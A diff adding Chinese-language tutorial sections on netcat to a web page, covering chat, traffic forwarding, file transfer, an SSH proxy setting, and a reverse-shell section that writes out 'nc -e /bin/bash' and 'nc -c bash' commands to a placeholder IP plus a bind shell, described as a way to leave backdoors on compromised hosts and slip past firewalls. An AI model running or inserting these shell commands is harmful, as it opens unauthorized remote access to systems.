@@ -205,6 +205,58 @@ ncat --ssl -lvp 1589
 <pre><code class="language-zsh"># 如果监听端使用了 --ssl 那么客户端也需要。
  ncat --ssl -nv &lt;IP Address&gt; 1589
 </code></pre>
+<p>成功建立通信后可以直接在命令行输入字符来进行通信，会像聊天一样。</p>
+<h3 id="流量转发"><a class="header" href="#流量转发">流量转发</a></h3>
+<p>流量转发可以用很多姿势，这里我用一个比较容易理解的姿势：</p>
+<pre><code class="language-zsh"># 目标机器
+nc -lvvp 1665
+# 中间负责转发的机器。-c 表示连接后直接用 sh 执行 -c 的内容。
+# 这里是表示连接到达中间服务器后，中间服务器再连接目标服务器，从而实现流量转发
+nc -lvvp 1589 -c 'nc -nv &lt;目标机器 IP&gt; &lt;端口&gt;'
+# 客户端
+nc -nv &lt;中间机器 IP&gt; &lt;中间机器端口&gt;
+</code></pre>
+<p>这样操作后，当客户端执行时，流量走向为：</p>
+<pre><code>客户端 -&gt; 中间机器 IP:PORT -&gt; 目标机器 IP:PORT
+</code></pre>
+<h3 id="发送文件"><a class="header" href="#发送文件">发送文件</a></h3>
+<p>既然都能通信了，那么发文件也是理所应当的，基本传文件本质也是流量传输。</p>
+<pre><code class="language-zsh"># 提供文件的机器，这样表示建立连接后把 temp.txt 的内容发送过去
+nc -lvvp 1665 &lt; temp.txt
+# 需要获取文件的机器，这样与目标建立连接后，把它发过来的内容重定向到一个文件中
+nc -nv &lt;IP&gt; &lt;PORT&gt; &gt; out.txt
+</code></pre>
+<p>方向换一下也是同理：</p>
+<pre><code class="language-zsh"># 接收文件的机器
+nc -lvvp 1665 &gt; out.txt
+# 发送文件的机器
+nc -nv &lt;IP&gt; &lt;PORT&gt; &lt; temp.txt
+</code></pre>
+<h3 id="反弹-shell"><a class="header" href="#反弹-shell">反弹 Shell</a></h3>
+<p>这个一般用于渗透时留后门，主要是利用 <code>nc</code> 的 <code>-c</code> 和 <code>-e</code> 。</p>
+<pre><code class="language-zsh"># 让客户端发送自己的 shell 给 &lt;IP&gt; &lt;PORT&gt;
+# 客户端，这样 &lt;IP&gt; &lt;PORT&gt; 被监听时就会拿到客户端的 shell
+# 后续 &lt;IP&gt; &lt;PORT&gt; 要再转发还是什么都可以自由操作
+nc -nv &lt;IP&gt; &lt;PORT&gt; -e /bin/bash
+-or
+nc -nv &lt;IP&gt; &lt;PORT&gt; -c bash
+</code></pre>
+<pre><code class="language-zsh"># 客户端开启一个端口，在这个端口上直接暴露自己的 shell
+nc -lp 6666 -e /bin/bash
+</code></pre>
+<p>如果用于渗透，肉鸡一般是内网环境，所以都是用的第一种，主动发送 shell 给攻击者。第二种需要攻击者能访问到肉鸡的 ip:port 才行。加上一般都有防火墙阻拦，肉鸡的入站流量可能会被防火墙拦截，但是防火墙一般不会对出站流量有限制，这也是第一种方式的用的比较多的原因。</p>
+<p>如果攻击者没有能让肉鸡访问到的 IP，一般通过内网穿透即可解决。</p>
+<h3 id="ssh-代理"><a class="header" href="#ssh-代理">SSH 代理</a></h3>
+<p>~/.ssh/config</p>
+<pre><code class="language-zsh">Host github.com
+  ProxyCommand ncat --proxy 127.0.0.1:10808 --proxy-type socks5  %h %p
+</code></pre>
+<p>这样对 github 仓库进行 <code>git pull</code> <code>git push</code> 这样的操作都会走代理。</p>
+<p><code>--proxy</code> 和 <code>--proxy-type</code> 可以让 <code>ncat</code> 摇身一变为一个代理工具。</p>
+<h3 id="--allow----allowfile"><a class="header" href="#--allow----allowfile"><code>--allow</code> / <code>--allowfile</code></a></h3>
+<p>限制可以连接到 <code>ncat</code>（<code>nc</code>） 的 hosts，可以指定一些 IP，来做到只允许指定目标连接。</p>
+<h3 id="--deny----denyfile"><a class="header" href="#--deny----denyfile"><code>--deny</code> / <code>--denyfile</code></a></h3>
+<p>与上面的相反，它是拒绝。</p>
 
                     <div id="giscus-container"></div>
                 </main>
